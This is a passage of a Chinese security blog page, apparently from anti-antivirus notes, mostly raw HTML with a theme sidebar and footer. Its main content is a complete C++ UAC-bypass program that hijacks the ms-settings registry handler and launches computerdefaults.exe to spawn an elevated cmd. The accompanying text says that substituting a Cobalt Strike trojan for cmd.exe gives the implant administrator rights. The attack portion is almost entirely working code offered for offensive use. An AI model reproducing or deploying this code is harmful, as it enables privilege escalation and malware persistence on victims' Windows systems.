class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// BypassUac.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">BypassUac</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* filename)</span> </span>&#123;</span><br><span class="line">    HKEY hKey;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* subKey = <span class="string">&quot;Software\\Classes\\ms-settings\\shell\\open\\command&quot;</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* valueName = <span class="string">&quot;DelegateExecute&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建或打开注册表键</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RegCreateKeyEx</span>(HKEY_CURRENT_USER, subKey, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>, KEY_WRITE, <span class="literal">NULL</span>, &amp;hKey, <span class="literal">NULL</span>) != ERROR_SUCCESS) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Unable to create or open registry key\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加 &quot;DelegateExecute&quot; 键值</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RegSetValueEx</span>(hKey, valueName, <span class="number">0</span>, REG_SZ, (<span class="type">const</span> BYTE*)<span class="string">&quot;&quot;</span>, <span class="built_in">sizeof</span>(<span class="string">&quot;&quot;</span>)) != ERROR_SUCCESS) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Unable to set registry value\n&quot;</span>;</span><br><span class="line">        <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置默认键值为 &quot;calc.exe&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RegSetValueEx</span>(hKey, <span class="literal">NULL</span>, <span class="number">0</span>, REG_SZ, (<span class="type">const</span> BYTE*)filename, <span class="built_in">strlen</span>(filename) + <span class="number">1</span>) != ERROR_SUCCESS) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Unable to set default registry value\n&quot;</span>;</span><br><span class="line">        <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	STARTUPINFO si;  <span class="comment">//进程启动信息</span></span><br><span class="line">	PROCESS_INFORMATION pi;  <span class="comment">//进程信息</span></span><br><span class="line">	<span class="built_in">ZeroMemory</span>(&amp;si, <span class="built_in">sizeof</span>(si));  <span class="comment">//将结构体si的所有成员都初始化为0</span></span><br><span class="line">	<span class="built_in">ZeroMemory</span>(&amp;pi, <span class="built_in">sizeof</span>(pi));  <span class="comment">//将结构体pi的所有成员都初始化为0</span></span><br><span class="line">	si.cb = <span class="built_in">sizeof</span>(si);  <span class="comment">//结构体大小</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">CreateProcess</span>(</span><br><span class="line">		<span class="string">&quot;C://windows//system32//cmd.exe&quot;</span>,  <span class="comment">//要执行的应用程序名称（包含路径）</span></span><br><span class="line">		(LPSTR)<span class="string">&quot;/c C://windows//system32//computerdefaults.exe&quot;</span>,  <span class="comment">//命令行参数</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//进程句柄不可被继承</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//线程句柄不可被继承</span></span><br><span class="line">		FALSE,  <span class="comment">//不继承句柄</span></span><br><span class="line">		<span class="number">0</span>,  <span class="comment">//标志位为0</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//使用父进程的环境变量</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//使用父进程的工作目录</span></span><br><span class="line">		&amp;si,  <span class="comment">//传递启动信息</span></span><br><span class="line">		&amp;pi)  <span class="comment">//传递进程信息</span></span><br><span class="line">		) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreateProcess failed (%d).\n&quot;</span>, <span class="built_in">GetLastError</span>());  <span class="comment">//打印错误信息</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//释放进程句柄和线程句柄</span></span><br><span class="line">	<span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//删除整个ms-settings目录</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">RegDeleteTree</span>(HKEY_CURRENT_USER,<span class="string">&quot;Software\\Classes\\ms-settings&quot;</span>) != ERROR_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;RegDeleteTree Error:%d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* filename = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">	<span class="built_in">BypassUac</span>(filename);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2><p>执行程序后返回一个管理员权限的cmd				</p>
+<p><img src="/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/%E5%8A%A8%E7%94%BB.gif" alt="动画"></p>
+<p>如果我们将cmd.exe替换成cs木马的地址，那么cs就会以管理员权限上线</p>
+<p><img src="/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/%E5%8A%A8%E7%94%BB-16874925352742.gif" alt="动画"></p>
+
+      </section>
+
+      
+      
+        <nav class="article-nav">
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2023/10/22/%E5%85%8D%E6%9D%80%E7%AC%94%E8%AE%B0/AntiAntiVirusNotes-master/WeakDefender/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">(no title)</h2>
+        </a>
+      
+      <div class="card-text--row">Newer</div>
+    </div>
+  </article>
+</div>
+          
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2023/10/22/%E5%85%8D%E6%9D%80%E7%AC%94%E8%AE%B0/AntiAntiVirusNotes-master/shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">(no title)</h2>
+        </a>
+      
+      <div class="card-text--row">Older</div>
+    </div>
+  </article>
+</div>
+          
+        </nav>
+      
+
+      <section class="page-message-container layout-padding">
+        
+
+
+  
+  
+
+  
+  
+
+
+      </section>
+    </div>
+    <div class="widget-info">
+      <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-body">
+    
+      <img src="https://s.gravatar.com/avatar/2d6b803eea37de0257620d5fabee7e64?s=200&amp;r=g&amp;d=retro" class="soft-size--round soft-style--box" alt="Sukoshi">
+    
+    
+      <h2>Sukoshi</h2>
+    
+    
+      <p>贵在坚持</p>
+    
+
+    <div class="count-box">
+      <div class="count-box--item">
+        <svg class="icon icon-article" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M240.51564747 647.74217627h196.07203239c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806V165.10332731c0-33.18142087-30.16492806-60.32985613-60.32985612-60.32985611H245.04038668C225.43318342 104.7734712 210.35071939 119.85593522 210.35071939 139.46313845V617.57724821c0 16.59071043 13.57421762 30.16492806 30.16492808 30.16492806z m663.62841731-452.47392089v482.63884894c0 33.18142087-27.14843525 60.32985613-60.32985612 60.32985613H180.18579134c-33.18142087 0-60.32985613-27.14843525-60.32985612-60.32985613V195.26825538c-49.77213131 0-90.49478418 40.72265287-90.49478417 90.49478417v452.4739209c0 49.77213131 40.72265287 90.49478418 90.49478417 90.49478417h286.56681657c16.59071043 0 30.16492806 13.57421762 30.16492807 30.16492807s13.57421762 30.16492806 30.16492805 30.16492806h90.49478418c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806s13.57421762-30.16492806 30.16492807-30.16492807h286.56681657c49.77213131 0 90.49478418-40.72265287 90.49478417-90.49478417V285.76303955c0-49.77213131-40.72265287-90.49478418-90.49478417-90.49478417zM587.41232014 647.74217627h191.54729318c19.60720323 0 34.68966726-15.08246403 34.68966729-34.68966727V134.93839925c0-16.59071043-13.57421762-30.16492806-30.16492808-30.16492805H617.57724821c-30.16492806 0-60.32985613 27.14843525-60.32985612 60.32985611v452.4739209c0 16.59071043 13.57421762 30.16492806 30.16492805 30.16492806z" fill="currentColor"></path>
+</svg>
+        <span>42</span>
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+        0
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+        3
+      </div>
+    </div>
+  </div>
+</section>
+
+      
+
+      
+<section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-notice" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M512 945.02305225v28.15620663a24.27259221 24.27259221 0 0 1-24.27259221 24.27259335H394.0352a48.54518557 48.54518557 0 0 1-41.74885888-23.78714112l-110.68302222-184.47170332a132.04290333 132.04290333 0 0 1-17.47626667-48.54518557h118.4502511a200.97706667 200.97706667 0 0 1 76.21594113 14.56355556l20.38897777 133.49925888a48.54518557 48.54518557 0 0 0 36.40888888 27.67075555l16.01991111 2.91271112a24.27259221 24.27259221 0 0 1 20.38897778 25.72894889zM997.45185223 463.45481443a194.18074112 194.18074112 0 0 1-38.8361489 116.50844445 24.75804445 24.75804445 0 0 1-36.4088889 0l-34.95253333-34.95253333a24.27259221 24.27259221 0 0 1-2.91271111-30.58346667 97.09036999 97.09036999 0 0 0 0-106.79940665 24.27259221 24.27259221 0 0 1 2.91271111-30.58346666l34.95253333-34.95253334a24.75804445 24.75804445 0 0 1 18.93262223-7.28177777 26.2144 26.2144 0 0 1 17.47626667 9.70903665A194.18074112 194.18074112 0 0 1 997.45185223 463.45481443z m-194.18074112-388.36148111v776.72296335a48.54518557 48.54518557 0 0 1-48.54518556 48.54518443h-28.64165888a48.54518557 48.54518557 0 0 1-33.98163001-14.07810332l-145.63555556-143.20829668A291.27111111 291.27111111 0 0 0 342.57730333 657.63555556H172.18370333a145.63555556 145.63555556 0 0 1-145.63555556-145.63555556v-97.09036999a145.63555556 145.63555556 0 0 1 145.63555556-145.63555556h170.3936a291.27111111 291.27111111 0 0 0 206.31703779-85.43952668l145.63555555-143.20829554a48.54518557 48.54518557 0 0 1 33.98162888-14.07810446H754.72592555a48.54518557 48.54518557 0 0 1 48.54518556 48.54518555z" fill="currentColor"></path>
+</svg>
+    <span>NOTICE</span>
+  </div>
+  <div class="widget-body">
+    <p>flex-block主题部分重构，详情查看https://github.com/miiiku/flex-block</p>
+  </div>
+</section>
+
+
+      <section class="widget-categorys widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+    <span>CATEGORYS</span>
+  </div>
+  <div class="widget-body">
+    <ul class="categorys-list">
+      
+    </ul>
+  </div>
+</section>
+
+      <section class="widget-tags widget-item  layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+    <span>TAGS</span>
+  </div>
+  <div class="widget-body">
+    <div class="tags-cloud">
+      <a href="/tags/Hexo/" style="font-size: 10px;" class="tags-cloud-0">Hexo</a> <a href="/tags/Markdown/" style="font-size: 10px;" class="tags-cloud-0">Markdown</a> <a href="/tags/%E7%BD%91%E7%AB%99/" style="font-size: 10px;" class="tags-cloud-0">网站</a>
+    </div>
+  </div>
+</section>
+    </div>
+  </article>
+</div>
+
+    <!-- footer container -->
+<footer id="footer" class="footer">
+  <div class="footer-container">
+    
+    <div class="social-icons">
+      
+        
+      
+        
+      
+        
+      
+        
+          <a href="https://github.com/miiiku/" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
+</svg>
+          </a>
+        
+      
+        
+          <a href="https://twitter.com/guanquanhong" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-twitter" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M962.285714 233.142857q-38.285714 56-92.571429 95.428571 0.571429 8 0.571429 24 0 74.285714-21.714286 148.285714t-66 142-105.428571 120.285714-147.428571 83.428571-184.571429 31.142857q-154.857143 0-283.428571-82.857143 20 2.285714 44.571429 2.285714 128.571429 0 229.142857-78.857143-60-1.142857-107.428571-36.857143t-65.142857-91.142857q18.857143 2.857143 34.857143 2.857143 24.571429 0 48.571429-6.285714-64-13.142857-106-63.714286t-42-117.428571l0-2.285714q38.857143 21.714286 83.428571 23.428571-37.714286-25.142857-60-65.714286t-22.285714-88q0-50.285714 25.142857-93.142857 69.142857 85.142857 168.285714 136.285714t212.285714 56.857143q-4.571429-21.714286-4.571429-42.285714 0-76.571429 54-130.571429t130.571429-54q80 0 134.857143 58.285714 62.285714-12 117.142857-44.571429-21.142857 65.714286-81.142857 101.714286 53.142857-5.714286 106.285714-28.571429z"></path>
+</svg>
+          </a>
+        
+      
+    </div>
+     
+    <p>&copy; 2023 <a href="/" target="_blank">John Doe</a></p>
+
+    
+
+    <p>Powered by <a href="https://hexo.io" target="_blank" rel="noopener noreferrer">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank" rel="noopener noreferrer author">flex-block</a></p>
+
+    <p>
+      <a href="javascript:;" id="theme-light">🌞 浅色</a>
+      <a href="javascript:;" id="theme-dark">🌛 深色</a>
+      <a href="javascript:;" id="theme-auto">🤖️ 自动</a>
+    </p>
+  </div>
+</footer>
+  </div>
+
+  <div class="back-to-top-fixed soft-size--round soft-style--box">
+    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
+      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
+      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
+    </svg>
+  </div>
+
+  
+  <!-- aplayer -->
+
+
+<!-- dplayer -->
+
+
+<!-- copy button  -->
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+<!-- https://clipboardjs.com/ -->
+
+
+<script type="text/javascript">
+	(function () {
+		function getCodeType (elem) {
+			const classs = Array.from(elem.classList.values());
+			if (classs && classs.length > 1) {
+				return classs[1];
+			}
+			return "plain";
+		}
+
+		window.addEventListener("DOMContentLoaded", () => {
+			const copyBtnClass = "copy-btn";
+			//  instantiate clipboardjs 
+			const clipboard = new ClipboardJS('.' + copyBtnClass);
+
+			clipboard.on('success', function (e) {
+				console.info('Action:', e.action);
+				console.info('Text:', e.text);
+				console.info('Trigger:', e.trigger);
+				if (e.trigger) {
+					e.trigger.classList.add("copied");
+					setTimeout(() => {
+						e.trigger.classList.remove("copied");
+					}, 3000);
+				}
+				e.clearSelection();
+			});
+
+			clipboard.on('error', function (e) {
+				console.error('Action:', e.action);
+				console.error('Trigger:', e.trigger);
+			});
+
+			document.querySelectorAll('figure.highlight').forEach((elem) => {
+				const codeContent = elem.querySelector("td.code");
+				const copyButton = document.createElement('button');
+				copyButton.setAttribute("class", copyBtnClass);
+				copyButton.setAttribute("title", "Copy Code");
+				copyButton.setAttribute("data-clipboard-text", codeContent.innerText);
+				elem.insertBefore(copyButton, elem.children[0]);
+			});
+		})
+	})();
+</script>
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+  
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+  <!-- 尾部用户自定义相关内容 -->
+</body>
+</html>
